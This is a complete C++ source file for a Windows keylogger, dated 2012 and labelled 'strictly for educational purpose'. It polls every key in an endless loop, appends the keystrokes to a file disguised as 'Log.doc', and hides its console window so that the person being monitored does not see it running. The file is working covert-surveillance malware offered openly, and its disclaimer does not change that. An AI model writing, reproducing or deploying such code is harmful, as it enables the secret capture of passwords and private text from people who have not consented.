/**********************************************************************************
#Author - Deepak
#Date - 06-Apr-2012
Description: This is a simple C++ program to capture keystrokes and write it to a file.
Strictly for educational purpose, I take no responsibility for any loss or damage with 
the usage of this program.
***********************************************************************************/

#include <iostream>
using namespace std;
#include <windows.h>
#include <Winuser.h>

int save (int key_stroke, char *file);
void stealth();

int main()
{
	stealth();
	char i;
	while(1) // Run indefinitely
	{
		for(i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) // Tracks if a key is pressed
				save(i,"Log.doc");  // Write to file
		}
	}
	system ("PAUSE"); // To make sure your CPU doesn't heat
	
	return 0;
} 
/* ************************************************* */
/* ************************************************* */
 int save (int key_stroke, char *file)
{
     if ( (key_stroke ==1) || (key_stroke ==2)) 
     return 0;
     
     FILE *OUTPUT_FILE; // Create a file pointer
     OUTPUT_FILE = fopen(file, "a+"); // Open the file for append
     
    cout << key_stroke << endl;
    
    if(key_stroke == 8) // Translate some ASCII - Key with mappings
    	fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    		else if (key_stroke == 13)
    	fprintf(OUTPUT_FILE, "%s", "[\n]");
    		else if (key_stroke == 32)
    	fprintf(OUTPUT_FILE, "%s", " ");
    		else if (key_stroke == VK_TAB)
    	fprintf(OUTPUT_FILE, "%s", "[TAB]");
    		else if (key_stroke == VK_SHIFT)
    	fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    		else if (key_stroke == VK_CONTROL)
    	fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    		else if (key_stroke == VK_ESCAPE)
    	fprintf(OUTPUT_FILE, "%s", "[ESC]");
    		else if (key_stroke == VK_END)
    	fprintf(OUTPUT_FILE, "%s", "[END]");
    		else if (key_stroke == VK_HOME)
    	fprintf(OUTPUT_FILE, "%s", "[HOME]");
    		else if (key_stroke == VK_UP)
    	fprintf(OUTPUT_FILE, "%s", "[UP]");
    		else if (key_stroke == VK_LEFT)
    	fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    		else if (key_stroke == VK_RIGHT)
    	fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    		else if (key_stroke == VK_DOWN)
    	fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    		else if (key_stroke == 190 || key_stroke == 110)
    	fprintf(OUTPUT_FILE, "%s", "[.]");
    		else
    			fprintf(OUTPUT_FILE, "%s", &key_stroke);

     fclose(OUTPUT_FILE); // Close the file
	return 0;
} 
/* ************************************************* */
/* ************************************************* */
void stealth()
{
	HWND stealth; // Declare a window handle
	AllocConsole(); // Allocate a new console to call the process
	stealth = FindWindowA("ConsoleWindowClass",NULL);  
	ShowWindow(stealth,0); // Hide 
}
